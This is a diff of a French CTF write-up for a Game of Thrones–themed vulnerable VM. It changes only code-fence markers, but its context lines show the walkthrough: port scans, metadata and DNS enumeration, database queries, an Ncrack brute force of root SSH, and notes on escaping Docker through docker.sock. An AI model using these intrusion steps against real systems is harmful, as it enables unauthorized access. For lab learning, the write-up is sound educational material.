@@ -23,7 +23,7 @@ Un scan approfondi de port... réal
 
 Bien-sûr la première chose à faire sur un CTF de ce type est de voir quelles sont les différentes portes.  
 
-```plain
+```
 Nmap scan report for 192.168.1.30
 Host is up (0.00076s latency).
 Not shown: 65526 closed ports
@@ -71,7 +71,7 @@ On tilte immédiatement sur l'indice sur les tags. D'autant plus que dans le mê
 
 Un petit *exiftool* sur le fichier mp3 nous offre notre premier flag :  
 
-```plain
+```
 ExifTool Version Number         : 10.10
 File Name                       : game_of_thrones.mp3
 Directory                       : .
@@ -120,7 +120,7 @@ Jetons maintenant un œil aux entrées du *robots.txt*.
 
 Si on se rend sur la première entrée on tombe sur une image de *Jon Snow* mourrant à *Castle Black*. Rien d'intéressant pour nous ici, sauf si bien sûr on spécifie le bon user-agent :  
 
-```plain
+```
 curl -A Three-eyed-raven http://192.168.1.30/the-tree/
 ```
 
@@ -154,7 +154,7 @@ L'autre entrée a une véritable utilité puisqu'il s'agit d'une carte qui donne
 
 Voici une retranscription textuelle des différentes étapes :  
 
-```plain
+```
 The seven kingdoms (flags):
   1 - Dorne (ftp)
   2 - The Wall & The North (http)
@@ -217,7 +217,7 @@ Winterfell c'est Sansa(s) !
 
 Le compte FTP permet de récupérer un flag ainsi que deux fichiers :  
 
-```plain
+```
 Connected to 192.168.1.30.
 220-------------------------
 220-"These are the Dorne city walls. We must enter!" - Grey Worm
@@ -340,7 +340,7 @@ Un AXFR sur la zone (*dig -t AXFR 7kingdoms.ctf @192.168.1.30*) nous indique que
 
 Un dig ANY nous retourne plus d'informations en revanche :  
 
-```plain
+```
 ; <<>> DiG 9.10.3-P4-Ubuntu <<>> -t ANY 7kingdoms.ctf @192.168.1.30
 ;; global options: +cmd
 ;; Got answer:
@@ -379,7 +379,7 @@ Un exiftool n'apporte rien mais un strings ou un hexdump montre qu'un indice a �
 
 > "Timef0rconqu3rs TeXT should be asked to enter into the Iron Islands fortress" - Theon Greyjoy
 
-```plain
+```
 $ dig -t TXT Timef0rconqu3rs.7kingdoms.ctf @192.168.0.3
 
 ;; ANSWER SECTION:
@@ -404,7 +404,7 @@ J'ai fouillé un peu pour voir si il y avait une faille quelconque dans le champ
 C'est l'heure de poser nos little fingers sur Postgres
 ------------------------------------------------------
 
-```plain
+```
 $ psql -h 192.168.0.3 -U robinarryn mountainandthevale
 Password for user robinarryn:
 psql (9.5.9, server 9.6.4)
@@ -496,7 +496,7 @@ La flemme de coder un script pour décoder ça du coup j'ai trouvé [une page](h
 
 On s'exécute :  
 
-```plain
+```
 $ psql -h 192.168.0.3 -U TheRedWomanMelisandre braavos
 Password for user TheRedWomanMelisandre:
 psql (9.5.9, server 9.6.4)
@@ -550,7 +550,7 @@ Pour autant le serveur IMAP n'a pas de bannière donnant le moindre indice :( Cl
 
 N'étant pas un expert en PostgreSQL je suis retourné sur le service et j'ai essayé d'autres commandes :  
 
-```plain
+```
 mountainandthevale=> \d
                       List of relations
  Schema |            Name            |   Type   |   Owner
@@ -643,7 +643,7 @@ db: kingslanding
 La (re)quête pour MySQL
 -----------------------
 
-```plain
+```
 $ mysql -h 127.0.0.1 -P 3336 -u cerseilannister -p kingslanding
 
 mysql> show tables;
@@ -667,7 +667,7 @@ Je trouve [un décodeur de Morse en ligne](http://www.onlineconversion.com/morse
 
 Le reste vient tout seul :  
 
-```plain
+```
 mysql> create table dump (data text);
 Query OK, 0 rows affected (0,19 sec)
 
@@ -693,7 +693,7 @@ mysql> select * from dump;
 Un petit verre de dragon pour la route ?
 ----------------------------------------
 
-```plain
+```
 $ ssh daenerystargaryen@192.168.0.3
 daenerystargaryen@192.168.0.3's password:
  __            _   _            ___
@@ -715,7 +715,7 @@ Linux 7kingdoms 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) x86_64 
 
 Le fichier */etc/passwd* indique la présence de deux utilisateurs non-root (dont le notre) :  
 
-```plain
+```
 daenerystargaryen:x:1000:1000:daenerystargaryen,,,:/home/daenerystargaryen:/bin/bash
 branstark:x:1001:1001::/home/branstark:/bin/bash
 ```
@@ -738,7 +738,7 @@ Ok, le commentaire de *Samwell Tarly* laisse entendre que l'on doit bruteforcer 
 
 Une fois *Ncrack* et ses librairies copiées sur le système :  
 
-```plain
+```
 LD_LIBRARY_PATH=. ./ncrack -u root -P ../digger.txt ssh://172.25.0.2 -T insane
 
 Starting Ncrack 0.6 ( http://ncrack.org ) at 2017-11-04 02:34 CET
@@ -753,7 +753,7 @@ Ncrack finished.
 
 Let's go !  
 
-```plain
+```
 daenerystargaryen@7kingdoms:~$ ssh root@172.25.0.2
 The authenticity of host '172.25.0.2 (172.25.0.2)' can't be established.
 ECDSA key fingerprint is SHA256:CLkjibFJaJn7gL10+IfE7LWYVS34ZgavwWKn+ej4LaU.
@@ -793,7 +793,7 @@ La Machine aux Multiples IPs
 
 On a maintenant accès au compte branstark membre du groupe docker.  
 
-```plain
+```
 $ ssh branstark@192.168.0.3
 branstark@192.168.0.3's password:
  _____ _         _    _____     _   _   _
@@ -812,7 +812,7 @@ Now you are ready to face the final battle!! Try to escalate to root.
 
 On peut lister les différentes images docker :  
 
-```plain
+```
 branstark@7kingdoms:~$ docker images
 REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
 ironislands           latest              ca673df5a4d0        8 weeks ago         214MB
@@ -830,7 +830,7 @@ Pour sortir d'un docker quand on a accès au fichier */run/docker.sock* (typique
 
 Sauf que rien à faire, même en jouant avec les paramètres de config j'obtenais toujours l'erreur suivante :  
 
-```plain
+```
 Get https://registry-1.docker.io/v1/repositories/library/redis/tags/latest: net/http: TLS handshake timeout.
 ```
 
@@ -878,7 +878,7 @@ Au lieu de retoucher au pseudo-code j'ai adapté Python :
 
 Le mot de passe *45c7676ae4252d9fd7212fb9554fc9* permet alors d'ouvrir l'archive 7z *final\_battle.zip* qui contient le fichier *flag.txt*  
 
-```plain
+```
 Final Battle flag: 8e63dcd86ef9574181a9b6184ed3dde5
                      _
  ___ _ _ _ ___ ___ _| |
